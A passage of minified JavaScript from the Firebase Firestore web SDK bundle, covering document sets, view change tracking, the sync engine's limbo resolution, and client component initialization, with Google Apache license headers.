 */class xl{static emptySet(e){return new xl(e.comparator)}constructor(e){this.comparator=e?(t,r)=>e(t,r)||Te.comparator(t.key,r.key):(t,r)=>Te.comparator(t.key,r.key),this.keyedMap=Jc(),this.sortedSet=new Qt(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal((t,r)=>(e(t),!1))}add(e){const t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){const t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof xl)||this.size!==e.size)return!1;const t=this.sortedSet.getIterator(),r=e.sortedSet.getIterator();for(;t.hasNext();){const i=t.getNext().key,s=r.getNext().key;if(!i.isEqual(s))return!1}return!0}toString(){const e=[];return this.forEach(t=>{e.push(t.toString())}),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,t){const r=new xl;return r.comparator=this.comparator,r.keyedMap=e,r.sortedSet=t,r}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yS{constructor(){this.Z_=new Qt(Te.comparator)}track(e){const t=e.doc.key,r=this.Z_.get(t);r?e.type!==0&&r.type===3?this.Z_=this.Z_.insert(t,e):e.type===3&&r.type!==1?this.Z_=this.Z_.insert(t,{type:r.type,doc:e.doc}):e.type===2&&r.type===2?this.Z_=this.Z_.insert(t,{type:2,doc:e.doc}):e.type===2&&r.type===0?this.Z_=this.Z_.insert(t,{type:0,doc:e.doc}):e.type===1&&r.type===0?this.Z_=this.Z_.remove(t):e.type===1&&r.type===2?this.Z_=this.Z_.insert(t,{type:1,doc:r.doc}):e.type===0&&r.type===1?this.Z_=this.Z_.insert(t,{type:2,doc:e.doc}):Ne():this.Z_=this.Z_.insert(t,e)}X_(){const e=[];return this.Z_.inorderTraversal((t,r)=>{e.push(r)}),e}}class Jl{constructor(e,t,r,i,s,o,a,l,u){this.query=e,this.docs=t,this.oldDocs=r,this.docChanges=i,this.mutatedKeys=s,this.fromCache=o,this.syncStateChanged=a,this.excludesMetadataChanges=l,this.hasCachedResults=u}static fromInitialDocuments(e,t,r,i,s){const o=[];return t.forEach(a=>{o.push({type:0,doc:a})}),new Jl(e,t,xl.emptySet(t),o,r,i,!0,!1,s)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&Xp(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const t=this.docChanges,r=e.docChanges;if(t.length!==r.length)return!1;for(let i=0;i<t.length;i++)if(t[i].type!==r[i].type||!t[i].doc.isEqual(r[i].doc))return!1;return!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fz{constructor(){this.ea=void 0,this.ta=[]}na(){return this.ta.some(e=>e.ra())}}class zz{constructor(){this.queries=wS(),this.onlineState="Unknown",this.ia=new Set}terminate(){(function(t,r){const i=Be(t),s=i.queries;i.queries=wS(),s.forEach((o,a)=>{for(const l of a.ta)l.onError(r)})})(this,new we(ie.ABORTED,"Firestore shutting down"))}}function wS(){return new xa(n=>Ck(n),Xp)}async function uC(n,e){const t=Be(n);let r=3;const i=e.query;let s=t.queries.get(i);s?!s.na()&&e.ra()&&(r=2):(s=new Fz,r=e.ra()?0:1);try{switch(r){case 0:s.ea=await t.onListen(i,!0);break;case 1:s.ea=await t.onListen(i,!1);break;case 2:await t.onFirstRemoteStoreListen(i)}}catch(o){const a=e1(o,`Initialization of query '${Ga(e.query)}' failed`);return void e.onError(a)}t.queries.set(i,s),s.ta.push(e),e.sa(t.onlineState),s.ea&&e.oa(s.ea)&&t1(t)}async function hC(n,e){const t=Be(n),r=e.query;let i=3;const s=t.queries.get(r);if(s){const o=s.ta.indexOf(e);o>=0&&(s.ta.splice(o,1),s.ta.length===0?i=e.ra()?0:1:!s.na()&&e.ra()&&(i=2))}switch(i){case 0:return t.queries.delete(r),t.onUnlisten(r,!0);case 1:return t.queries.delete(r),t.onUnlisten(r,!1);case 2:return t.onLastRemoteStoreUnlisten(r);default:return}}function Wz(n,e){const t=Be(n);let r=!1;for(const i of e){const s=i.query,o=t.queries.get(s);if(o){for(const a of o.ta)a.oa(i)&&(r=!0);o.ea=i}}r&&t1(t)}function $z(n,e,t){const r=Be(n),i=r.queries.get(e);if(i)for(const s of i.ta)s.onError(t);r.queries.delete(e)}function t1(n){n.ia.forEach(e=>{e.next()})}var By,vS;(vS=By||(By={}))._a="default",vS.Cache="cache";class fC{constructor(e,t,r){this.query=e,this.aa=t,this.ua=!1,this.ca=null,this.onlineState="Unknown",this.options=r||{}}oa(e){if(!this.options.includeMetadataChanges){const r=[];for(const i of e.docChanges)i.type!==3&&r.push(i);e=new Jl(e.query,e.docs,e.oldDocs,r,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.ua?this.la(e)&&(this.aa.next(e),t=!0):this.ha(e,this.onlineState)&&(this.Pa(e),t=!0),this.ca=e,t}onError(e){this.aa.error(e)}sa(e){this.onlineState=e;let t=!1;return this.ca&&!this.ua&&this.ha(this.ca,e)&&(this.Pa(this.ca),t=!0),t}ha(e,t){if(!e.fromCache||!this.ra())return!0;const r=t!=="Offline";return(!this.options.Ta||!r)&&(!e.docs.isEmpty()||e.hasCachedResults||t==="Offline")}la(e){if(e.docChanges.length>0)return!0;const t=this.ca&&this.ca.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&this.options.includeMetadataChanges===!0}Pa(e){e=Jl.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.ua=!0,this.aa.next(e)}ra(){return this.options.source!==By.Cache}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dC{constructor(e){this.key=e}}class pC{constructor(e){this.key=e}}class Hz{constructor(e,t){this.query=e,this.fa=t,this.ga=null,this.hasCachedResults=!1,this.current=!1,this.pa=Ye(),this.mutatedKeys=Ye(),this.ya=Rk(e),this.wa=new xl(this.ya)}get Sa(){return this.fa}ba(e,t){const r=t?t.Da:new yS,i=t?t.wa:this.wa;let s=t?t.mutatedKeys:this.mutatedKeys,o=i,a=!1;const l=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,u=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal((h,f)=>{const p=i.get(h),w=eg(this.query,f)?f:null,x=!!p&&this.mutatedKeys.has(p.key),k=!!w&&(w.hasLocalMutations||this.mutatedKeys.has(w.key)&&w.hasCommittedMutations);let I=!1;p&&w?p.data.isEqual(w.data)?x!==k&&(r.track({type:3,doc:w}),I=!0):this.va(p,w)||(r.track({type:2,doc:w}),I=!0,(l&&this.ya(w,l)>0||u&&this.ya(w,u)<0)&&(a=!0)):!p&&w?(r.track({type:0,doc:w}),I=!0):p&&!w&&(r.track({type:1,doc:p}),I=!0,(l||u)&&(a=!0)),I&&(w?(o=o.add(w),s=k?s.add(h):s.delete(h)):(o=o.delete(h),s=s.delete(h)))}),this.query.limit!==null)for(;o.size>this.query.limit;){const h=this.query.limitType==="F"?o.last():o.first();o=o.delete(h.key),s=s.delete(h.key),r.track({type:1,doc:h})}return{wa:o,Da:r,ls:a,mutatedKeys:s}}va(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,r,i){const s=this.wa;this.wa=e.wa,this.mutatedKeys=e.mutatedKeys;const o=e.Da.X_();o.sort((h,f)=>function(w,x){const k=I=>{switch(I){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return Ne()}};return k(w)-k(x)}(h.type,f.type)||this.ya(h.doc,f.doc)),this.Ca(r),i=i!=null&&i;const a=t&&!i?this.Fa():[],l=this.pa.size===0&&this.current&&!i?1:0,u=l!==this.ga;return this.ga=l,o.length!==0||u?{snapshot:new Jl(this.query,e.wa,s,o,e.mutatedKeys,l===0,u,!1,!!r&&r.resumeToken.approximateByteSize()>0),Ma:a}:{Ma:a}}sa(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({wa:this.wa,Da:new yS,mutatedKeys:this.mutatedKeys,ls:!1},!1)):{Ma:[]}}xa(e){return!this.fa.has(e)&&!!this.wa.has(e)&&!this.wa.get(e).hasLocalMutations}Ca(e){e&&(e.addedDocuments.forEach(t=>this.fa=this.fa.add(t)),e.modifiedDocuments.forEach(t=>{}),e.removedDocuments.forEach(t=>this.fa=this.fa.delete(t)),this.current=e.current)}Fa(){if(!this.current)return[];const e=this.pa;this.pa=Ye(),this.wa.forEach(r=>{this.xa(r.key)&&(this.pa=this.pa.add(r.key))});const t=[];return e.forEach(r=>{this.pa.has(r)||t.push(new pC(r))}),this.pa.forEach(r=>{e.has(r)||t.push(new dC(r))}),t}Oa(e){this.fa=e.gs,this.pa=Ye();const t=this.ba(e.documents);return this.applyChanges(t,!0)}Na(){return Jl.fromInitialDocuments(this.query,this.wa,this.mutatedKeys,this.ga===0,this.hasCachedResults)}}const n1="SyncEngine";class qz{constructor(e,t,r){this.query=e,this.targetId=t,this.view=r}}class Kz{constructor(e){this.key=e,this.Ba=!1}}class Gz{constructor(e,t,r,i,s,o){this.localStore=e,this.remoteStore=t,this.eventManager=r,this.sharedClientState=i,this.currentUser=s,this.maxConcurrentLimboResolutions=o,this.La={},this.ka=new xa(a=>Ck(a),Xp),this.qa=new Map,this.Qa=new Set,this.$a=new Qt(Te.comparator),this.Ua=new Map,this.Ka=new Hv,this.Wa={},this.Ga=new Map,this.za=Zl.Kn(),this.onlineState="Unknown",this.ja=void 0}get isPrimaryClient(){return this.ja===!0}}async function Qz(n,e,t=!0){const r=_C(n);let i;const s=r.ka.get(e);return s?(r.sharedClientState.addLocalQueryTarget(s.targetId),i=s.view.Na()):i=await gC(r,e,t,!0),i}async function Yz(n,e){const t=_C(n);await gC(t,e,!0,!1)}async function gC(n,e,t,r){const i=await mz(n.localStore,Ri(e)),s=i.targetId,o=n.sharedClientState.addLocalQueryTarget(s,t);let a;return r&&(a=await Zz(n,e,s,o==="current",i.resumeToken)),n.isPrimaryClient&&t&&iC(n.remoteStore,i),a}async function Zz(n,e,t,r,i){n.Ha=(f,p,w)=>async function(k,I,A,b){let E=I.view.ba(A);E.ls&&(E=await hS(k.localStore,I.query,!1).then(({documents:L})=>I.view.ba(L,E)));const O=b&&b.targetChanges.get(I.targetId),W=b&&b.targetMismatches.get(I.targetId)!=null,q=I.view.applyChanges(E,k.isPrimaryClient,O,W);return ES(k,I.targetId,q.Ma),q.snapshot}(n,f,p,w);const s=await hS(n.localStore,e,!0),o=new Hz(e,s.gs),a=o.ba(s.documents),l=Sh.createSynthesizedTargetChangeForCurrentChange(t,r&&n.onlineState!=="Offline",i),u=o.applyChanges(a,n.isPrimaryClient,l);ES(n,t,u.Ma);const h=new qz(e,t,o);return n.ka.set(e,h),n.qa.has(t)?n.qa.get(t).push(e):n.qa.set(t,[e]),u.snapshot}async function Jz(n,e,t){const r=Be(n),i=r.ka.get(e),s=r.qa.get(i.targetId);if(s.length>1)return r.qa.set(i.targetId,s.filter(o=>!Xp(o,e))),void r.ka.delete(e);r.isPrimaryClient?(r.sharedClientState.removeLocalQueryTarget(i.targetId),r.sharedClientState.isActiveQueryTarget(i.targetId)||await Dy(r.localStore,i.targetId,!1).then(()=>{r.sharedClientState.clearQueryState(i.targetId),t&&Qv(r.remoteStore,i.targetId),Uy(r,i.targetId)}).catch(pc)):(Uy(r,i.targetId),await Dy(r.localStore,i.targetId,!0))}async function Xz(n,e){const t=Be(n),r=t.ka.get(e),i=t.qa.get(r.targetId);t.isPrimaryClient&&i.length===1&&(t.sharedClientState.removeLocalQueryTarget(r.targetId),Qv(t.remoteStore,r.targetId))}async function e9(n,e,t){const r=a9(n);try{const i=await function(o,a){const l=Be(o),u=yn.now(),h=a.reduce((w,x)=>w.add(x.key),Ye());let f,p;return l.persistence.runTransaction("Locally write mutations","readwrite",w=>{let x=ws(),k=Ye();return l.ds.getEntries(w,h).next(I=>{x=I,x.forEach((A,b)=>{b.isValidDocument()||(k=k.add(A))})}).next(()=>l.localDocuments.getOverlayedDocuments(w,x)).next(I=>{f=I;const A=[];for(const b of a){const E=mF(b,f.get(b.key).overlayedDocument);E!=null&&A.push(new ko(b.key,E,Ek(E.value.mapValue),fi.exists(!0)))}return l.mutationQueue.addMutationBatch(w,u,A,a)}).next(I=>{p=I;const A=I.applyToLocalDocumentSet(f,k);return l.documentOverlayCache.saveOverlays(w,I.batchId,A)})}).then(()=>({batchId:p.batchId,changes:Nk(f)}))}(r.localStore,e);r.sharedClientState.addPendingMutation(i.batchId),function(o,a,l){let u=o.Wa[o.currentUser.toKey()];u||(u=new Qt($e)),u=u.insert(a,l),o.Wa[o.currentUser.toKey()]=u}(r,i.batchId,t),await Ah(r,i.changes),await og(r.remoteStore)}catch(i){const s=e1(i,"Failed to persist write");t.reject(s)}}async function mC(n,e){const t=Be(n);try{const r=await dz(t.localStore,e);e.targetChanges.forEach((i,s)=>{const o=t.Ua.get(s);o&&(st(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1),i.addedDocuments.size>0?o.Ba=!0:i.modifiedDocuments.size>0?st(o.Ba):i.removedDocuments.size>0&&(st(o.Ba),o.Ba=!1))}),await Ah(t,r,e)}catch(r){await pc(r)}}function _S(n,e,t){const r=Be(n);if(r.isPrimaryClient&&t===0||!r.isPrimaryClient&&t===1){const i=[];r.ka.forEach((s,o)=>{const a=o.view.sa(e);a.snapshot&&i.push(a.snapshot)}),function(o,a){const l=Be(o);l.onlineState=a;let u=!1;l.queries.forEach((h,f)=>{for(const p of f.ta)p.sa(a)&&(u=!0)}),u&&t1(l)}(r.eventManager,e),i.length&&r.La.p_(i),r.onlineState=e,r.isPrimaryClient&&r.sharedClientState.setOnlineState(e)}}async function t9(n,e,t){const r=Be(n);r.sharedClientState.updateQueryState(e,"rejected",t);const i=r.Ua.get(e),s=i&&i.key;if(s){let o=new Qt(Te.comparator);o=o.insert(s,er.newNoDocument(s,De.min()));const a=Ye().add(s),l=new rg(De.min(),new Map,new Qt($e),o,a);await mC(r,l),r.$a=r.$a.remove(s),r.Ua.delete(e),r1(r)}else await Dy(r.localStore,e,!1).then(()=>Uy(r,e,t)).catch(pc)}async function n9(n,e){const t=Be(n),r=e.batch.batchId;try{const i=await fz(t.localStore,e);wC(t,r,null),yC(t,r),t.sharedClientState.updateMutationState(r,"acknowledged"),await Ah(t,i)}catch(i){await pc(i)}}async function r9(n,e,t){const r=Be(n);try{const i=await function(o,a){const l=Be(o);return l.persistence.runTransaction("Reject batch","readwrite-primary",u=>{let h;return l.mutationQueue.lookupMutationBatch(u,a).next(f=>(st(f!==null),h=f.keys(),l.mutationQueue.removeMutationBatch(u,f))).next(()=>l.mutationQueue.performConsistencyCheck(u)).next(()=>l.documentOverlayCache.removeOverlaysForBatchId(u,h,a)).next(()=>l.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(u,h)).next(()=>l.localDocuments.getDocuments(u,h))})}(r.localStore,e);wC(r,e,t),yC(r,e),r.sharedClientState.updateMutationState(e,"rejected",t),await Ah(r,i)}catch(i){await pc(i)}}function yC(n,e){(n.Ga.get(e)||[]).forEach(t=>{t.resolve()}),n.Ga.delete(e)}function wC(n,e,t){const r=Be(n);let i=r.Wa[r.currentUser.toKey()];if(i){const s=i.get(e);s&&(t?s.reject(t):s.resolve(),i=i.remove(e)),r.Wa[r.currentUser.toKey()]=i}}function Uy(n,e,t=null){n.sharedClientState.removeLocalQueryTarget(e);for(const r of n.qa.get(e))n.ka.delete(r),t&&n.La.Ja(r,t);n.qa.delete(e),n.isPrimaryClient&&n.Ka.br(e).forEach(r=>{n.Ka.containsKey(r)||vC(n,r)})}function vC(n,e){n.Qa.delete(e.path.canonicalString());const t=n.$a.get(e);t!==null&&(Qv(n.remoteStore,t),n.$a=n.$a.remove(e),n.Ua.delete(t),r1(n))}function ES(n,e,t){for(const r of t)r instanceof dC?(n.Ka.addReference(r.key,e),i9(n,r)):r instanceof pC?(me(n1,"Document no longer in limbo: "+r.key),n.Ka.removeReference(r.key,e),n.Ka.containsKey(r.key)||vC(n,r.key)):Ne()}function i9(n,e){const t=e.key,r=t.path.canonicalString();n.$a.get(t)||n.Qa.has(r)||(me(n1,"New document in limbo: "+t),n.Qa.add(r),r1(n))}function r1(n){for(;n.Qa.size>0&&n.$a.size<n.maxConcurrentLimboResolutions;){const e=n.Qa.values().next().value;n.Qa.delete(e);const t=new Te(Mt.fromString(e)),r=n.za.next();n.Ua.set(r,new Kz(t)),n.$a=n.$a.insert(t,r),iC(n.remoteStore,new Gs(Ri(Vv(t.path)),r,"TargetPurposeLimboResolution",Yp.ae))}}async function Ah(n,e,t){const r=Be(n),i=[],s=[],o=[];r.ka.isEmpty()||(r.ka.forEach((a,l)=>{o.push(r.Ha(l,e,t).then(u=>{var h;if((u||t)&&r.isPrimaryClient){const f=u?!u.fromCache:(h=t==null?void 0:t.targetChanges.get(l.targetId))===null||h===void 0?void 0:h.current;r.sharedClientState.updateQueryState(l.targetId,f?"current":"not-current")}if(u){i.push(u);const f=Kv.Yi(l.targetId,u);s.push(f)}}))}),await Promise.all(o),r.La.p_(i),await async function(l,u){const h=Be(l);try{await h.persistence.runTransaction("notifyLocalViewChanges","readwrite",f=>re.forEach(u,p=>re.forEach(p.Hi,w=>h.persistence.referenceDelegate.addReference(f,p.targetId,w)).next(()=>re.forEach(p.Ji,w=>h.persistence.referenceDelegate.removeReference(f,p.targetId,w)))))}catch(f){if(!gc(f))throw f;me(Gv,"Failed to update sequence numbers: "+f)}for(const f of u){const p=f.targetId;if(!f.fromCache){const w=h.Ts.get(p),x=w.snapshotVersion,k=w.withLastLimboFreeSnapshotVersion(x);h.Ts=h.Ts.insert(p,k)}}}(r.localStore,s))}async function s9(n,e){const t=Be(n);if(!t.currentUser.isEqual(e)){me(n1,"User change. New user:",e.toKey());const r=await eC(t.localStore,e);t.currentUser=e,function(s,o){s.Ga.forEach(a=>{a.forEach(l=>{l.reject(new we(ie.CANCELLED,o))})}),s.Ga.clear()}(t,"'waitForPendingWrites' promise is rejected due to a user change."),t.sharedClientState.handleUserChange(e,r.removedBatchIds,r.addedBatchIds),await Ah(t,r.Rs)}}function o9(n,e){const t=Be(n),r=t.Ua.get(e);if(r&&r.Ba)return Ye().add(r.key);{let i=Ye();const s=t.qa.get(e);if(!s)return i;for(const o of s){const a=t.ka.get(o);i=i.unionWith(a.view.Sa)}return i}}function _C(n){const e=Be(n);return e.remoteStore.remoteSyncer.applyRemoteEvent=mC.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=o9.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=t9.bind(null,e),e.La.p_=Wz.bind(null,e.eventManager),e.La.Ja=$z.bind(null,e.eventManager),e}function a9(n){const e=Be(n);return e.remoteStore.remoteSyncer.applySuccessfulWrite=n9.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=r9.bind(null,e),e}class Xd{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=ig(e.databaseInfo.databaseId),this.sharedClientState=this.Za(e),this.persistence=this.Xa(e),await this.persistence.start(),this.localStore=this.eu(e),this.gcScheduler=this.tu(e,this.localStore),this.indexBackfillerScheduler=this.nu(e,this.localStore)}tu(e,t){return null}nu(e,t){return null}eu(e){return hz(this.persistence,new lz,e.initialUser,this.serializer)}Xa(e){return new Xk(qv.ri,this.serializer)}Za(e){return new wz}async terminate(){var e,t;(e=this.gcScheduler)===null||e===void 0||e.stop(),(t=this.indexBackfillerScheduler)===null||t===void 0||t.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}Xd.provider={build:()=>new Xd};class l9 extends Xd{constructor(e){super(),this.cacheSizeBytes=e}tu(e,t){st(this.persistence.referenceDelegate instanceof Zd);const r=this.persistence.referenceDelegate.garbageCollector;return new KF(r,e.asyncQueue,t)}Xa(e){const t=this.cacheSizeBytes!==void 0?dr.withCacheSize(this.cacheSizeBytes):dr.DEFAULT;return new Xk(r=>Zd.ri(r,t),this.serializer)}}class jy{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=r=>_S(this.syncEngine,r,1),this.remoteStore.remoteSyncer.handleCredentialChange=s9.bind(null,this.syncEngine),await Vz(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return function(){return new zz}()}createDatastore(e){const t=ig(e.databaseInfo.databaseId),r=function(s){return new Sz(s)}(e.databaseInfo);return function(s,o,a,l){return new xz(s,o,a,l)}(e.authCredentials,e.appCheckCredentials,r,t)}createRemoteStore(e){return function(r,i,s,o,a){return new Cz(r,i,s,o,a)}(this.localStore,this.datastore,e.asyncQueue,t=>_S(this.syncEngine,t,0),function(){return pS.D()?new pS:new vz}())}createSyncEngine(e,t){return function(i,s,o,a,l,u,h){const f=new Gz(i,s,o,a,l,u);return h&&(f.ja=!0),f}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}async terminate(){var e,t;await async function(i){const s=Be(i);me(ya,"RemoteStore shutting down."),s.W_.add(5),await Th(s),s.z_.shutdown(),s.j_.set("Unknown")}(this.remoteStore),(e=this.datastore)===null||e===void 0||e.terminate(),(t=this.eventManager)===null||t===void 0||t.terminate()}}jy.provider={build:()=>new jy};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class EC{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.iu(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.iu(this.observer.error,e):ys("Uncaught Error in snapshot listener:",e.toString()))}su(){this.muted=!0}iu(e,t){setTimeout(()=>{this.muted||e(t)},0)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _o="FirestoreClient";class c9{constructor(e,t,r,i,s){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=r,this.databaseInfo=i,this.user=Jn.UNAUTHENTICATED,this.clientId=uk.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=s,this.authCredentials.start(r,async o=>{me(_o,"Received user=",o.uid),await this.authCredentialListener(o),this.user=o}),this.appCheckCredentials.start(r,o=>(me(_o,"Received new app check token=",o),this.appCheckCredentialListener(o,this.user)))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new as;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){const r=e1(t,"Failed to shutdown persistence");e.reject(r)}}),e.promise}}async function Um(n,e){n.asyncQueue.verifyOperationInProgress(),me(_o,"Initializing OfflineComponentProvider");const t=n.configuration;await e.initialize(t);let r=t.initialUser;n.setCredentialChangeListener(async i=>{r.isEqual(i)||(await eC(e.localStore,i),r=i)}),e.persistence.setDatabaseDeletedListener(()=>n.terminate()),n._offlineComponents=e}async function IS(n,e){n.asyncQueue.verifyOperationInProgress();const t=await u9(n);me(_o,"Initializing OnlineComponentProvider"),await e.initialize(t,n.configuration),n.setCredentialChangeListener(r=>mS(e.remoteStore,r)),n.setAppCheckTokenChangeListener((r,i)=>mS(e.remoteStore,i)),n._onlineComponents=e}async function u9(n){if(!n._offlineComponents)if(n._uninitializedComponentsProvider){me(_o,"Using user provided OfflineComponentProvider");try{await Um(n,n._uninitializedComponentsProvider._offline)}catch(e){const t=e;if(!function(i){return i.name==="FirebaseError"?i.code===ie.FAILED_PRECONDITION||i.code===ie.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11}(t))throw t;Kl("Error using user provided cache. Falling back to memory cache: "+t),await Um(n,new Xd)}}else me(_o,"Using default OfflineComponentProvider"),await Um(n,new l9(void 0));return n._offlineComponents}async function IC(n){return n._onlineComponents||(n._uninitializedComponentsProvider?(me(_o,"Using user provided OnlineComponentProvider"),await IS(n,n._uninitializedComponentsProvider._online)):(me(_o,"Using default OnlineComponentProvider"),await IS(n,new jy))),n._onlineComponents}function h9(n){return IC(n).then(e=>e.syncEngine)}async function SC(n){const e=await IC(n),t=e.eventManager;return t.onListen=Qz.bind(null,e.syncEngine),t.onUnlisten=Jz.bind(null,e.syncEngine),t.onFirstRemoteStoreListen=Yz.bind(null,e.syncEngine),t.onLastRemoteStoreUnlisten=Xz.bind(null,e.syncEngine),t}function f9(n,e,t={}){const r=new as;return n.asyncQueue.enqueueAndForget(async()=>function(s,o,a,l,u){const h=new EC({next:p=>{h.su(),o.enqueueAndForget(()=>hC(s,f));const w=p.docs.has(a);!w&&p.fromCache?u.reject(new we(ie.UNAVAILABLE,"Failed to get document because the client is offline.")):w&&p.fromCache&&l&&l.source==="server"?u.reject(new we(ie.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):u.resolve(p)},error:p=>u.reject(p)}),f=new fC(Vv(a.path),h,{includeMetadataChanges:!0,Ta:!0});return uC(s,f)}(await SC(n),n.asyncQueue,e,t,r)),r.promise}function d9(n,e,t={}){const r=new as;return n.asyncQueue.enqueueAndForget(async()=>function(s,o,a,l,u){const h=new EC({next:p=>{h.su(),o.enqueueAndForget(()=>hC(s,f)),p.fromCache&&l.source==="server"?u.reject(new we(ie.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):u.resolve(p)},error:p=>u.reject(p)}),f=new fC(a,h,{includeMetadataChanges:!0,Ta:!0});return uC(s,f)}(await SC(n),n.asyncQueue,e,t,r)),r.promise}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
